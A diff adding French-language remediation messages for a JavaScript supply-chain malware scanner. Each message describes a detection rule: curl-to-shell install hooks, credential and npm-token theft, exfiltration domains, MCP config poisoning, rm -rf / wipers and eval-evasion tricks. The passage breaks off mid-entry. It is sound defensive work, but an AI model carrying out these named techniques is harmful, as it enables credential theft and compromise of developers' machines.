+  env_charcode_reconstruction:
+    'Obfuscation detectee: le nom de la variable d\'environnement est reconstruit dynamiquement via fromCharCode ' +
+    'pour eviter la detection statique. Technique de vol de GITHUB_TOKEN, NPM_TOKEN, etc. ' +
+    'Verifier quelles variables sont accedees et si elles sont exfiltrees.',
+
+  lifecycle_hidden_payload:
+    'CRITIQUE: Le script lifecycle pointe vers un fichier cache dans node_modules/. ' +
+    'Ce pattern est utilise par les attaques DPRK/Lazarus pour cacher le payload dans un repertoire ' +
+    'que les scanners excluent par defaut. Examiner le fichier cible immediatement.',
+
+  lifecycle_shell_pipe:
+    'CRITIQUE: Le script lifecycle (preinstall/postinstall) pipe du code distant vers un shell (curl | sh). ' +
+    'NE PAS installer. Ceci execute du code arbitraire a l\'installation. ' +
+    'Si deja installe: considerer la machine compromise. Auditer les modifications systeme.',
+
+  cross_file_dataflow:
+    'CRITIQUE: Un module lit des credentials et les exporte vers un autre module qui les envoie sur le reseau. ' +
+    'Exfiltration inter-fichiers confirmee. Isoler la machine, supprimer le package, regenerer TOUS les secrets. ' +
+    'Auditer les connexions reseau recentes pour identifier les donnees exfiltrees.',
+
+  credential_tampering:
+    'CRITIQUE: Ecriture detectee dans un cache sensible (npm _cacache, yarn, pip). ' +
+    'Possible cache poisoning: injection de code malveillant dans des packages caches. ' +
+    'Nettoyer le cache: npm cache clean --force. Reinstaller les dependances depuis zero.',
+
+  require_cache_poison:
+    'CRITIQUE: require.cache modifie pour hijacker des modules Node.js. ' +
+    'Le code remplace les exports de modules charges (https, http, fs) pour intercepter toutes les requetes. ' +
+    'Supprimer le package. Redemarrer le processus Node.js. Auditer le trafic reseau recent.',
+
+  staged_binary_payload:
+    'Fichier binaire (.png/.jpg/.wasm) reference avec eval() dans le meme fichier. ' +
+    'Technique de steganographie: le payload malveillant est cache dans les pixels d\'une image ou les sections d\'un WASM. ' +
+    'Analyser le fichier binaire dans un sandbox. Verifier les donnees extraites avant execution.',
+
+  staged_eval_decode:
+    'CRITIQUE: eval() ou Function() recoit un argument decode en base64 (atob/Buffer.from). ' +
+    'Technique de staged payload: le code malveillant est encode puis decode et execute dynamiquement. ' +
+    'Isoler la machine. Decoder le payload manuellement pour analyser le code execute. Supprimer le package.',
+
+  crypto_decipher:
+    'crypto.createDecipher/createDecipheriv detecte. Dechiffrement de payload embarque a runtime. ' +
+    'Pattern canonique de l\'attaque event-stream/flatmap-stream. Extraire et decoder le payload manuellement ' +
+    'pour analyser le code execute. Verifier la source des donnees chiffrees.',
+
+  module_compile:
+    'CRITIQUE: module._compile() detecte. Cette API Node.js interne execute du code arbitraire ' +
+    'a partir d\'une chaine dans le contexte d\'un module. Utilisee dans flatmap-stream pour executer ' +
+    'un payload dechiffre sans ecrire sur disque. Isoler immediatement. Analyser la source de la chaine compilee.',
+
+  zlib_inflate_eval:
+    'CRITIQUE: Payload obfusque detecte — zlib inflate + decodage base64 + execution dynamique dans le meme fichier. ' +
+    'Ce pattern est la signature de la campagne SANDWORM_MODE (fev. 2026). Aucun package legitime ne combine ces 3 elements. ' +
+    'Isoler immediatement la machine. Decoder manuellement: zlib.inflateSync(Buffer.from(data, "base64")).toString(). Supprimer le package.',
+
+  module_compile_dynamic:
+    'CRITIQUE: Module._compile() avec argument dynamique (variable, expression). Execution de code en memoire ' +
+    'sans ecriture sur disque. Technique d\'evasion utilisee dans flatmap-stream et SANDWORM_MODE. ' +
+    'Isoler immediatement. Tracer la source de la chaine compilee pour extraire le payload.',
+
+  write_execute_delete:
+    'Pattern anti-forensique detecte: ecriture dans un repertoire temporaire (/tmp, /dev/shm, os.tmpdir()), ' +
+    'execution via require() ou Module._compile(), puis suppression via unlinkSync/rmSync. ' +
+    'Ce pattern de staging est typique des malwares cherchant a eviter la detection post-mortem. ' +
+    'Isoler la machine et inspecter les artefacts temporaires avant nettoyage.',
+
+  mcp_config_injection:
+    'CRITIQUE: Ecriture dans les fichiers de configuration MCP d\'assistants IA (.claude/, .cursor/, .continue/, .vscode/). ' +
+    'Technique SANDWORM_MODE: le malware empoisonne la configuration MCP pour ajouter des serveurs malveillants. ' +
+    'Verifier immediatement les fichiers de config IA. Supprimer les entrees MCP non reconnues. Supprimer le package.',
+
+  git_hooks_injection:
+    'Injection de hooks Git detectee. Le package ecrit dans .git/hooks/ (pre-commit, pre-push, etc.) ' +
+    'ou modifie git config init.templateDir pour la persistence globale. ' +
+    'Verifier .git/hooks/ et git config --global --list. Supprimer les hooks non reconnus.',
+
+  electron_app_injection:
+    'CRITIQUE: Injection dans une application Electron tierce. Le package localise une app Electron installee ' +
+    '(Discord, Atomic Wallet, Slack, ...) via os.homedir()+.asar/discord_desktop_core+existsSync, puis ecrase ' +
+    'son code (index.js du core module / app.asar) avec un payload injecte (hook webContents.debugger, override ' +
+    'XMLHttpRequest.prototype.send, BrowserWindow) — le payload s\'execute avec l\'identite de l\'app cible pour ' +
+    'intercepter credentials/MFA ou detourner des adresses crypto. Verifier l\'integrite de l\'app ciblee ' +
+    '(reinstaller depuis la source officielle), rechercher le code injecte dans son core/.asar, revoquer tout ' +
+    'credential saisi dans l\'app compromise, et supprimer le package. Considerer le poste comme compromis si le hook a tourne.',
+
+  env_harvesting_dynamic:
+    'Collecte dynamique de variables d\'environnement via Object.entries/keys/values(process.env) ' +
+    'avec filtrage par patterns sensibles. Technique de vol de credentials a grande echelle. ' +
+    'Verifier les tokens/secrets exposes. Revoquer immediatement les credentials compromis.',
+
+  dns_chunk_exfiltration:
+    'Exfiltration via requetes DNS detectee. Les donnees sont encodees en base64 et envoyees comme sous-domaines DNS. ' +
+    'Cette technique contourne les firewalls et proxies car le DNS est rarement filtre. ' +
+    'Bloquer les requetes DNS sortantes du package. Verifier les donnees exfiltrees.',
+
+  llm_api_key_harvesting:
+    'Acces a 3+ cles API de providers LLM (OpenAI, Anthropic, Google, etc.). Usage unique = legitime, ' +
+    'acces multiples = collecte pour revente ou abus. Verifier si le package a une raison ' +
+    'legitime d\'acceder a plusieurs providers. Revoquer les cles exposees si necessaire.',
+
+  suspicious_domain:
+    'Domaine C2 ou d\'exfiltration detecte dans le code source. Ces domaines (oastify.com, webhook.site, ngrok.io, etc.) ' +
+    'sont utilises pour recevoir des donnees volees ou relayer des commandes. Verifier si le package a une raison ' +
+    'legitime d\'utiliser ce domaine. Bloquer les connexions sortantes vers ce domaine.',
+
+  fetch_decrypt_exec:
+    'CRITIQUE: Chaine steganographique detectee. Le code telecharge un fichier distant, le dechiffre via crypto, ' +
+    'puis execute le resultat via eval/Function. Pattern buildrunner-dev: payload malveillant cache dans une image PNG. ' +
+    'Isoler immediatement. Analyser le payload dechiffre. Supprimer le package.',
+
+  crypto_exfil:
+    'CRITIQUE: Exfiltration chiffree de secrets. Le code aspire des credentials/env, les chiffre (RSA publicEncrypt / AES createCipheriv, ' +
+    'souvent une enveloppe hybride avec cle publique embarquee) puis les envoie sur le reseau vers une destination non first-party. ' +
+    'Le chiffrement masque le payload aux inspections DLP/taint (pattern litellm/Hades). Isoler immediatement. Identifier la cle publique ' +
+    'et le host de destination (C2). Revoquer les secrets potentiellement exposes. Supprimer le package.',
+
+  download_exec_binary:
+    'CRITIQUE: Pattern download-execute detecte. Le code telecharge un binaire, le rend executable (chmod 755), ' +
+    'puis l\'execute via execSync. Dropper deguise en compilation native addon (NeoShadow pattern). ' +
+    'Bloquer les telechargements. Verifier les binaires ecrits sur disque. Supprimer le package.',
+
+  ide_persistence:
+    'Persistence IDE detectee. Le code ecrit dans tasks.json ou la configuration VS Code avec execution automatique ' +
+    'a l\'ouverture du dossier (runOn: folderOpen, reveal: silent). Pattern FAMOUS CHOLLIMA / StegaBin. ' +
+    'Verifier ~/.config/Code/User/tasks.json et supprimer les taches inconnues.',
+
+  vm_code_execution:
+    'CRITIQUE: Execution de code via le module vm de Node.js. Les methodes vm.runInThisContext(), vm.runInNewContext(), ' +
+    'vm.compileFunction() et new vm.Script() permettent d\'executer du code dynamique en contournant la detection eval/Function. ' +
+    'Analyser le code source execute. Verifier s\'il s\'agit d\'un moteur de templates ou d\'un payload malveillant.',
+
+  reflect_code_execution:
+    'CRITIQUE: Execution de code via l\'API Reflect. Reflect.construct(Function, [...]) et Reflect.apply(eval, ...) ' +
+    'contournent la detection directe de eval/new Function(). Technique d\'evasion avancee. ' +
+    'Analyser les arguments passes a Reflect. Supprimer le package si non justifie.',
+
+  process_binding_abuse:
+    'CRITIQUE: Acces direct aux bindings V8 internes via process.binding() ou process._linkedBinding(). ' +
+    'Permet l\'execution de commandes (spawn_sync) ou l\'acces au systeme de fichiers (fs) sans passer par les modules Node.js standards. ' +
+    'Technique d\'evasion avancee contournant toute la couche d\'abstraction. Supprimer immediatement.',
+
+  worker_thread_exec:
+    'new Worker() avec eval:true detecte. Le code s\'execute dans un thread worker separe, contournant la detection AST du thread principal. ' +
+    'Verifier le contenu du code passe au Worker. Si dynamique ou obfusque, supprimer le package. ' +
+    'Analyser les communications inter-threads (parentPort, workerData) pour identifier le payload.',
+
+  fragmented_high_entropy_cluster:
+    'Cluster de chaines courtes a haute entropie detecte. Possible fragmentation de payload pour eviter la detection. ' +
+    'Reconstituer les fragments et analyser le contenu combine. Verifier si les chaines sont concatenees ou reassemblees a l\'execution.',
+
+  wasm_host_sink:
+    'CRITIQUE: Module WebAssembly charge avec des imports host contenant des sinks reseau. Le flux de controle est cache dans le binaire WASM, ' +
+    'rendant l\'analyse statique impossible. Le WASM peut lire des fichiers sensibles et exfiltrer via les callbacks host. ' +
+    'Supprimer le package immediatement. Analyser le fichier WASM avec wasm2wat pour comprendre le flux. Regenerer tous les secrets.',
+  wasm_standalone:
+    'Module WebAssembly charge sans sink reseau apparent. Usage potentiellement legitime (crypto, image, codecs video). ' +
+    'Verifier le fichier .wasm avec wasm2wat. Si le package n\'a aucune raison d\'utiliser du WASM, considerer comme suspect.',
+  credential_regex_harvest:
+    'Code contient des regex de detection de credentials (Bearer, password, token, API key) combine avec un appel reseau. ' +
+    'Technique de harvesting: scanne les donnees en transit (streams HTTP, fichiers) pour extraire des secrets et les exfiltrer. ' +
+    'Supprimer le package. Auditer le trafic reseau sortant.',
+  builtin_override_exfil:
+    'Code remplace une methode built-in (console.log/warn/error, Object.defineProperty) et contient un appel reseau. ' +
+    'Technique de monkey-patching: intercepte les donnees passant par les APIs natives pour les exfiltrer. ' +
+    'Supprimer le package. Verifier si d\'autres methodes natives ont ete modifiees.',
+  stream_credential_intercept:
+    'Classe stream (Transform/Duplex/Writable) avec regex de credentials et appel reseau. ' +
+    'Technique de wiretap: le stream intercepte les donnees en transit, scanne pour des secrets (Bearer, password, token) ' +
+    'et les exfiltre via un appel reseau. Supprimer le package.',
+  remote_code_load:
+    'CRITIQUE: Fetch reseau + eval/new Function() dans le meme fichier. ' +
+    'Technique multi-stage: le package telecharge un payload depuis un serveur distant (SVG, HTML, JSON) puis l\'execute. ' +
+    'Supprimer le package. Bloquer le domaine C2 au niveau firewall.',
+  proxy_data_intercept:
+    'CRITIQUE: Un Proxy JavaScript avec trap set/get/apply est combine avec un appel reseau. ' +
+    'Technique d\'interception: le Proxy capture toutes les ecritures de proprietes (credentials, tokens, config) ' +
+    'et les exfiltre via HTTPS/fetch/dgram. Supprimer le package. Auditer tous les modules qui importent ce package.',
+  proxy_globalthis_intercept:
+    'CRITIQUE: new Proxy(globalThis/global) intercepte tous les acces au scope global. ' +
+    'L\'attaquant peut hooker eval, Function, require de maniere transparente via le handler Proxy. ' +
+    'Supprimer le package immediatement.',
+  reflect_bind_code_execution:
+    'CRITIQUE: Reflect.apply() avec methode prototype (bind/call/apply) et thisArg=Function/eval. ' +
+    'Evasion de 2nd niveau contournant la detection Reflect.apply(eval). Supprimer le package.',
+  detached_credential_exfil:
+    'CRITIQUE: Process detache avec acces aux credentials et exfiltration reseau. ' +
+    'Technique DPRK/Lazarus: le process fils survit au parent (detached:true, unref()) et exfiltre des secrets en arriere-plan. ' +
+    'Supprimer le package immediatement. Regenerer tous les tokens/credentials. Auditer les process en cours d\'execution.',
+  intent_credential_exfil:
+    'CRITIQUE: Coherence d\'intention detectee — lecture de credentials combinee avec exfiltration reseau. ' +
+    'Pattern multi-fichier DPRK/Lazarus: chaque fichier semble legitime individuellement mais le package ' +
+    'dans son ensemble collecte des secrets et les envoie sur le reseau. Supprimer le package immediatement. ' +
+    'Regenerer tous les tokens/credentials exposes. Auditer le package.json pour les scripts lifecycle.',
+  intent_command_exfil:
+    'Coherence d\'intention detectee — sortie de commande systeme combinee avec exfiltration reseau. ' +
+    'Le package execute des commandes et transmet les resultats. Verifier les commandes executees. ' +
+    'Supprimer le package si non attendu. Auditer les logs reseau pour identifier les donnees exfiltrees.',
+
+  unicode_invisible_injection:
+    'CRITIQUE: Caracteres Unicode invisibles detectes (zero-width, variation selectors). ' +
+    'Technique GlassWorm: du code malveillant est encode via des variation selectors invisibles dans les editeurs. ' +
+    'Analyser le fichier avec un editeur hexa. Supprimer le package immediatement. ' +
+    'Verifier les autres fichiers du projet pour des injections similaires.',
+
+  unicode_variation_decoder:
+    'CRITIQUE: Decodeur de payload Unicode via variation selectors detecte (.codePointAt + 0xFE00/0xE0100). ' +
+    'Signature GlassWorm: le code reconstruit un payload octet par octet a partir de caracteres invisibles. ' +
+    'Isoler immediatement. Decoder manuellement les variation selectors pour extraire le payload. Supprimer le package.',
+
+  blockchain_c2_resolution:
+    'Import Solana/Web3 + appel API blockchain C2 (getSignaturesForAddress, getTransaction) detecte. ' +
+    'Technique GlassWorm: la blockchain sert de dead drop resolver pour obtenir l\'adresse C2 via le champ memo. ' +
+    'Cout de rotation: 0.000005 SOL par changement d\'adresse C2 — censorship-resistant. ' +
+    'Bloquer les connexions vers les RPC Solana. Supprimer le package.',
+
+  dangerous_constructor:
+    'CRITIQUE: Acces au constructeur AsyncFunction/GeneratorFunction via Object.getPrototypeOf(). ' +
+    'Technique d\'evasion avancee: le constructeur n\'est pas accessible directement comme eval() ou Function(), ' +
+    'mais peut etre obtenu via la chaine prototype. Permet l\'execution de code arbitraire asynchrone. ' +
+    'Supprimer le package immediatement. Auditer le code genere dynamiquement.',
+
+  module_load_bypass:
+    'CRITIQUE: Module._load() detecte — bypass du module loader interne de Node.js. ' +
+    'Permet de charger dynamiquement des modules (child_process, fs, net) sans passer par require(), ' +
+    'contournant les restrictions et les hooks de chargement. ' +
+    'Supprimer le package immediatement. Auditer les modules charges dynamiquement.',
+
+  split_entropy_payload:
+    'CRITIQUE: Payload haute entropie fragmente en ≥3 chunks concatenes pour contourner la detection. ' +
+    'Le resultat concatene est passe a eval/Function/atob/Buffer.from, indiquant un dechiffrement ou une execution staged. ' +
+    'Technique d\'evasion: chaque chunk individuel a une entropie basse, mais la concatenation revele le payload. ' +
+    'Supprimer le package immediatement. Analyser le payload decode dans un sandbox.',
+
+  blockchain_rpc_endpoint:
+    'Endpoint RPC blockchain hardcode detecte (Solana mainnet, Infura Ethereum). ' +
+    'Dans un package non-crypto, cela indique un potentiel canal C2 via blockchain. ' +
+    'Verifier le contexte: si le package n\'a rien a voir avec la blockchain, supprimer immediatement.',
+
+  crypto_staged_payload:
+    'CRITIQUE: Chaine steganographique complete detectee — fichier binaire (.png/.jpg/.wasm) avec eval() + dechiffrement crypto. ' +
+    'Le payload malveillant est cache dans un fichier binaire et dechiffre a runtime. Supprimer le package immediatement. ' +
+    'Analyser le fichier binaire dans un sandbox pour extraire le payload.',
+
+  lifecycle_typosquat:
+    'CRITIQUE: Package avec nom similaire a un package populaire ET scripts lifecycle. ' +
+    'Vecteur classique de dependency confusion: le code s\'execute a l\'installation. ' +
+    'NE PAS installer. Verifier le nom exact du package. Signaler sur npm.',
+
+  lifecycle_version99:
+    'CRITIQUE: Version a major repdigit "win-semver" (99/999/9999) + hook lifecycle = ' +
+    'dependency confusion complete. La version elevee force npm a resoudre vers ce package ' +
+    'public au lieu du package interne prive, et le hook execute le payload a l\'installation. ' +
+    'NE PAS installer. Verifier si un package interne du meme nom existe. Regenerer les secrets ' +
+    'exposes. Signaler sur npm.',
+
+  lifecycle_inline_exec:
+    'CRITIQUE: Script lifecycle avec node -e (execution inline). Le code s\'execute automatiquement a npm install. ' +
+    'NE PAS installer. Si deja installe: considerer la machine compromise. ' +
+    'Auditer les modifications systeme recentes.',
+
+  lifecycle_remote_require:
+    'CRITIQUE: Script lifecycle avec require(http/https) pour charger du code distant. ' +
+    'Le payload est telecharge et execute automatiquement a l\'installation. ' +
+    'NE PAS installer. Bloquer les connexions sortantes. Supprimer le package.',
+
+  lifecycle_file_exec:
+    'CRITIQUE: Un script lifecycle (preinstall/postinstall) execute un fichier JS contenant des menaces HIGH/CRITICAL. ' +
+    'Le malware est cache derriere une indirection: package.json → node setup.js → payload malveillant. ' +
+    'NE PAS installer. Supprimer le package immediatement. Auditer le fichier reference.',
+
+  uncaught_exception_exfil:
+    'CRITIQUE: Exfiltration silencieuse via process.on("uncaughtException"). ' +
+    'Le handler intercepte les erreurs pour envoyer les credentials (process.env) a un serveur externe. ' +
+    'Regenerer immediatement tous les secrets. Supprimer le package. Auditer les connexions sortantes.',
+
+  websocket_credential_exfil:
+    'CRITIQUE: Exfiltration de credentials via canal non-HTTP (WebSocket, MQTT, Socket.io). ' +
+    'Les proxies HTTP ne detectent pas ce trafic. Regenerer immediatement tous les secrets exposes. ' +
+    'Bloquer les connexions sortantes sur les ports non-HTTP. Supprimer le package.',
+
+  lifecycle_dataflow:
+    'CRITIQUE: Script lifecycle (preinstall/postinstall) combine avec un flux de donnees suspect. ' +
+    'Le package lit des credentials et les envoie via le reseau a l\'installation. ' +
+    'NE PAS installer. Regenerer les secrets. Supprimer le package immediatement.',
+
+  lifecycle_dangerous_exec:
+    'CRITIQUE: Script lifecycle combine avec execution de commande shell dangereuse. ' +
+    'Le package execute des commandes systeme arbitraires a l\'installation (curl, wget, nc, bash). ' +
+    'NE PAS installer. Bloquer les connexions sortantes. Supprimer le package immediatement.',
+
+  obfuscated_lifecycle_env:
+    'CRITIQUE: Code obfusque + acces aux variables d\'environnement + script lifecycle. ' +
+    'Triple signal d\'exfiltration install-time: le code est masque pour voler des credentials. ' +
+    'NE PAS installer. Regenerer tous les secrets. Supprimer le package immediatement.',
+
+  suspicious_module_sink:
+    'Module reseau non-HTTP (ws, mqtt, socket.io) utilise comme sink de donnees. ' +
+    'Verifier si des donnees sensibles sont envoyees via ce canal. ' +
+    'Les proxies HTTP classiques ne filtrent pas ce trafic.',
+
+  large_package_graph_truncated:
+    'Package volumineux (> MAX_GRAPH_NODES fichiers). Cross-file dataflow non analyse. ' +
+    'Auditer les sous-modules manuellement ou scanner par sous-paquet. ' +
+    'Sur un monorepo, scanner chaque workspace independamment.',
+
+  monorepo_detected:
+    'Monorepo detecte — scanner chaque workspace individuellement pour un verdict per-package. ' +
+    'Le score global reflete un perimetre agrege ; muaddib ne supporte pas encore le scoring per-workspace. ' +
+    'Ignorer les FP structurels (.yarn/, packages/*/test/, fixtures/) sera ajoute en v2.12.',
+
+  bin_field_hijack:
+    'CRITIQUE: Le champ "bin" de package.json shadow une commande systeme (node, npm, git, bash, etc.). ' +
+    'A l\'installation, npm cree un symlink dans node_modules/.bin/ qui intercepte la commande reelle. ' +
+    'Tous les npm scripts executeront le code malveillant au lieu de la vraie commande. ' +
+    'NE PAS installer. Si deja installe: rm -rf node_modules && npm cache clean --force && npm install.',
+
+  git_dependency_rce:
+    'Dependance utilisant une URL git+ ou git://. Vecteur d\'attaque PackageGate: si le package contient ' +
+    'un .npmrc avec git=./malicious.sh, npm executera le script au lieu de git, meme avec --ignore-scripts. ' +
+    'Verifier le contenu du .npmrc. Ne pas installer de packages avec des dependances git non vérifiées.',
+
+  npmrc_git_override:
+    'CRITIQUE: Fichier .npmrc contient git= override — technique PackageGate. Le binaire git est remplace ' +
+    'par un script controle par l\'attaquant. TOUTE operation git (clone, fetch, pull) executera le script malveillant. ' +
+    'NE PAS installer. Si deja installe: supprimer le package, verifier .npmrc, reinstaller git.',
+
+  node_modules_write:
+    'CRITIQUE: Le code ecrit dans node_modules/ — technique de propagation worm Shai-Hulud 2.0. ' +
+    'Le malware modifie d\'autres packages installes (ethers, webpack, etc.) pour injecter un backdoor persistent. ' +
+    'Verifier l\'integrite de tous les packages: rm -rf node_modules && npm install. ' +
+    'Auditer les fichiers modifies. Regenerer tous les secrets si le code a ete execute.',
+
+  bun_runtime_evasion:
+    'Invocation du runtime Bun detectee — technique Shai-Hulud 2.0. Le payload est execute via bun run ' +
+    'au lieu de node, echappant a toutes les sandboxes Node.js et au monitoring (--experimental-permission). ' +
+    'Verifier si bun est installe: which bun. Supprimer le package. ' +
+    'Auditer les processus: ps aux | grep bun.',
+
+  static_timer_bomb:
+    'Timer avec delai > 1h detecte dans l\'analyse statique (setTimeout/setInterval). ' +
+    'Technique PhantomRaven: le payload s\'active 48h+ apres l\'installation pour echapper aux sandboxes. ' +
+    'Analyser le callback du timer pour identifier le payload retarde. ' +
+    'Si delai > 24h: fort indicateur de time-bomb malware. NE PAS installer.',
+
+  timer_delayed_payload:
+    'Timer avec delai >= 60s contenant un sink dangereux (eval/exec/spawn) dans le callback. ' +
+    'Technique d\'evasion temporelle: le payload attend que les sandboxes timeout avant de s\'activer. ' +
+    'Analyser le contenu du callback: rechercher exfiltration de credentials, reverse shell, ou telechargement de payload. ' +
+    'Si delai >= 15min: forte probabilite de malware. NE PAS installer.',
+
+  npm_publish_worm:
+    'CRITIQUE: exec("npm publish") detecte — propagation worm. Le code utilise des tokens npm voles ' +
+    'pour publier des versions infectees des packages de la victime. Technique Shai-Hulud 1.0 et 2.0. ' +
+    'Isoler immediatement la machine. Revoquer les tokens npm: npm token revoke. ' +
+    'Verifier les packages publies: npm profile ls. Signaler sur npm.',
+
+  systemd_persistence:
+    'CRITIQUE: Ecriture dans un chemin systemd ou execution de systemctl enable/start. ' +
+    'Pattern CanisterWorm (pgmon.service) et TeamPCP (sysmon.service). ' +
+    'Aucun package npm legitime ne cree de services systemd. ' +
+    'Verifier: systemctl --user list-units | grep pgmon. ' +
+    'Supprimer: systemctl --user stop pgmon && rm ~/.config/systemd/user/pgmon.service. ' +
+    'Inspecter ~/.local/share/pgmon/ pour les payloads.',
+
+  npm_token_steal:
+    'CRITIQUE: exec("npm config get _authToken") ou exec("npm whoami") detecte. ' +
+    'Extraction programmatique de credentials npm — pattern findNpmTokens() de CanisterWorm. ' +
+    'Le token vole sera utilise pour publier des versions infectees de vos packages. ' +
+    'Revoquer immediatement: npm token revoke <token>. Verifier les publications recentes.',
+
+  root_filesystem_wipe:
+    'CRITIQUE: rm -rf / detecte — suppression totale du systeme de fichiers. ' +
+    'Pattern kamikaze.sh du wiper CanisterWorm ciblant les systemes Iran (Asia/Tehran). ' +
+    'NE PAS executer. Isoler immediatement. Signaler comme destructware.',
+
+  geo_evasion_killswitch:
+    'Code verifie la locale systeme pour "ru" et fait process.exit — technique CIS kill switch ' +
+    'classique de malware (TeamPCP, Lazarus) pour eviter de cibler les systemes russophones. ' +
+    'Signal fort en combinaison avec d\'autres indicateurs. Analyser le code complet du package.',
+
+  proc_mem_scan:
+    'CRITIQUE: Acces a /proc/*/mem — extraction de secrets depuis la memoire des processus. ' +
+    'Technique TeamPCP credential stealer dans Trivy v0.69.4. ' +
+    'Scanne les processus CI runner pour extraire les secrets GitHub Actions. ' +
+    'Verifier que Trivy est en version >= 0.69.5. Rotation immediate de tous les secrets CI/CD.',
+
+  ollama_local_llm:
+    'Reference au port Ollama (11434) detectee. PhantomRaven Wave 4 utilise un LLM local (DeepSeek Coder) ' +
+    'pour reecrire le malware a chaque execution, evitant la detection par signature. Moteur polymorphe. ' +
+    'Verifier si Ollama est installe: curl http://localhost:11434/api/tags. ' +
+    'Aucun package npm legitime n\'appelle un LLM local. Supprimer le package.',
+
+  pth_persistence:
+    'CRITIQUE: Ecriture d\'un fichier .pth detectee. Les fichiers .pth dans site-packages/ sont executes ' +
+    'automatiquement par Python au demarrage — c\'est un vecteur de persistence invisible. ' +
+    'Technique LiteLLM/Checkmarx (mars 2026): litellm_init.pth contient du code base64 qui installe un stealer ' +
+    'dans ~/.config/sysmon/ et exfiltre vers checkmarx.zone. ' +
+    'Verifier: find $(python -c "import site; print(site.getsitepackages()[0])") -name "*.pth" -exec cat {} \\; ' +
+    'Supprimer tout fichier .pth non standard. Rotation des credentials.',
+
+  // Audit v3 Bypass Playbooks (AST-062 to AST-069)
+  reflect_apply_require:
+    'CRITIQUE: Reflect.apply(require, null, [module]) detecte — contournement de require() via Reflect API. ' +
+    'Aucun package legitime ne charge des modules via Reflect.apply. ' +
+    'Supprimer le package. Auditer les modules charges dynamiquement.',
+
+  finalization_registry_exec:
+    'CRITIQUE: FinalizationRegistry avec callback dangereux (child_process/exec/spawn). ' +
+    'Le callback s\'execute apres le garbage collection, hors du flux synchrone — evasion sandbox. ' +
+    'Aucun usage legitime ne combine FinalizationRegistry avec des appels systeme. Supprimer le package.',
+
+  function_prototype_constructor:
+    'CRITIQUE: Acces au constructeur Function via chaine de prototypes — (function(){}).constructor(code) ' +
+    'ou [].constructor.constructor(code). Equivalent a eval() mais invisible aux detections statiques de eval/Function. ' +
+    'Supprimer le package. Aucun usage legitime.',
+
+  prototype_pollution:
+    'HAUTE: Pollution de prototype detectee (__proto__, __defineGetter__, __defineSetter__). ' +
+    'Peut detourner les proprietes heritees de tous les objets du runtime. ' +
+    'Verifier si le code modifie Object.prototype ou des prototypes de classes natives. ' +
+    'Si combine avec du code d\'execution dynamique, traiter comme CRITIQUE.',
+
+  module_wrap_override:
+    'CRITIQUE: Module.wrap remplace — la fonction wrapper du module loader est detournee. ' +
+    'Tout module charge apres cette modification execute du code injecte. ' +
+    'Aucun package legitime ne remplace Module.wrap. Supprimer immediatement.',
+
+  symbol_property_hiding:
+    'HAUTE: Module dangereux cache derriere une propriete Symbol. ' +
+    'Invisible a Object.keys(), JSON.stringify() et for...in. Technique anti-forensics. ' +
+    'Auditer toutes les proprietes Symbol du module. Supprimer si combine avec child_process/fs.',
+
+  with_body_dangerous:
+    'HAUTE: with() statement avec require/exec/spawn dans le body. ' +
+    'Le with() rend les identifiants ambigus, empechant l\'analyse statique. ' +
+    'Aucun code moderne legitime n\'utilise with(). Supprimer le package.',
+
+  require_process_mainmodule:
+    'CRITIQUE: require("process").mainModule.require() detecte — contournement de la detection ' +
+    'process.mainModule.require() via require("process") au lieu de l\'objet global. ' +
+    'Aucun package legitime n\'utilise ce pattern. Supprimer immediatement.',
+
+  // Blue Team v8 — New playbook entries
+  shared_memory_ipc:
+    'SharedArrayBuffer + Worker Thread detectes. Canal IPC memoire partagee qui contourne la surveillance. ' +
+    'Verifier si les workers manipulent des donnees sensibles. Isoler si combine avec eval/exec.',
+
+  websocket_c2:
+    'HAUTE: Connexion WebSocket vers domaine suspect ou avec execution dynamique. Canal C2 persistant bidirectionnel. ' +
+    'Analyser l\'URL de connexion. Bloquer les connexions WebSocket sortantes. Verifier les messages echanges.',
+
+  udp_exfiltration:
+    'HAUTE: Socket UDP (dgram) avec envoi de donnees. Exfiltration contournant les firewalls HTTP. ' +
+    'Verifier les destinations IP. Bloquer le trafic UDP sortant non-DNS. Auditer les donnees envoyees.',
+
+  native_addon_install:
+    'HAUTE: binding.gyp avec script lifecycle non-standard. Code natif compile a l\'installation. ' +
+    'Verifier le contenu de binding.gyp et les sources C/C++. Installer avec --ignore-scripts si suspect.',
+
+  gyp_command_exec:
+    'CRITIQUE: binding.gyp utilise la command-substitution GYP <!(...) / <!@(...) — execution de code a l\'installation via node-gyp, sans script lifecycle (pattern Phantom Gyp). ' +
+    'Decoder la commande substituee. NE PAS installer : node-gyp l\'execute au build meme avec --ignore-scripts. Verifier la source officielle du package.',
+
+  gyp_phantom_exec:
+    'CRITIQUE (compound Phase 1b): binding.gyp lance <!(node x.js) / <!(python y.py) au configure-time via node-gyp (aucun script lifecycle requis) ET le fichier invoque est juge malveillant de facon independante par les scanners AST/dataflow/module-graph. ' +
+    'Payload install-time confirme — NE PAS installer. Analyser le fichier invoque (nomme dans le message), c\'est lui qui porte la charge. node-gyp l\'execute meme avec --ignore-scripts.',
+
+  install_native_drop_exec:
+    'CRITIQUE (compound COMPOUND-020): un hook preinstall/install/postinstall lance `node x.js` qui depaquette un binaire natif EMBARQUE dans le package (lecture locale / gunzip / base64), l\'ecrit executable et le spawn — au moment de npm install, sans reseau, sans import (pattern jscrambler@8.14.0, infostealer natif). ' +
+    'NE PAS installer : --ignore-scripts ne protege pas si deja installe. Le fichier nomme dans le message porte la charge. Roter les credentials accessibles aux environnements dev/CI ayant installe la version, verifier les logs d\'install pour l\'execution du loader, revenir a une version verifiee saine.',
+
+  binary_masquerading_as_source:
+    'HAUTE: un fichier a extension source (.js/.ts/.cjs/.mjs) a un contenu BINAIRE (executable / archive / conteneur custom), souvent cache dans dist/ ou l\'analyse texte ne regarde pas — porteur de charge utile deguise en source (pattern jscrambler@8.14.0 dist/intro.js, 7.8 Mo). ' +
+    'Ouvrir le fichier en hexdump, identifier le format (ELF/PE/Mach-O/gzip/CSI). Verifier quel script d\'install ou loader le lit+execute (cf. install_native_drop_exec). NE PAS installer si couple a un hook d\'install.',
+
+  string_mutation_obfuscation:
+    'HAUTE: Chaine de .replace() reconstruisant des noms d\'API dangereuses (leet-speak). ' +
+    'Technique d\'evasion par substitution de caracteres. Decoder la chaine finale. Supprimer si malveillant.',
+
+  crontab_systemd_write:
+    'CRITIQUE: Ecriture dans les fichiers cron/crontab. Persistence via tache planifiee. ' +
+    'Verifier /etc/cron*, /var/spool/cron. Supprimer les entrees ajoutees. Auditer crontab -l.',
+
+  isolated_suspicious_file:
